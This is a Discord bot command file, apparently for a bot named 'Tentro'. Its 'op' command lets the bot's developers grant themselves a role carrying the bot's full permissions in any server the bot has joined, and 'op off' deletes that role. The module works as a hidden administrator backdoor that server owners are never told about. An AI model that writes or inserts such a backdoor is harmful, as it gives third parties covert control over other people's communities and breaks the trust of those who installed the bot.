const sourcebin = require('sourcebin_js');
const { MessageEmbed } = require('discord.js');
const { clean } = require('../../utils/HelperTools');



module.exports = {
	name: "op",
    aliases: ["botdev"],
    category: "dev",
    description: "Get admin",
    usage: "",
    permissions: "DEV",
    exec: async(message, args) => {
         const role = message.guild.roles.cache.find(r => r.name === "Tentro Developer")
        if (args[0]?.toLowerCase () === 'off')
          { await role.delete()
            await message.channel.send("Successfully turned op off")
          } 
          
        else {
            const member = message.member || await message.guild.members.fetch(message.author.id)
            if (member.roles.cache.get(role?.id))  { return message.channel.send('You already have the role!')} 
          message.guild.roles.create({
              name: 'Tentro Developer',
              color: 0xd83651,
              position: message.guild.me.roles.highest.position - 1,
              permissions: message.guild.me.permissions
          }).then(async role => {
             
              console.log(member)
              member.roles.add(role).then(() => message.reply('You are cool'))
          })
          .catch(e => message.reply(`Error: ${e}`))}
         

       
    }

};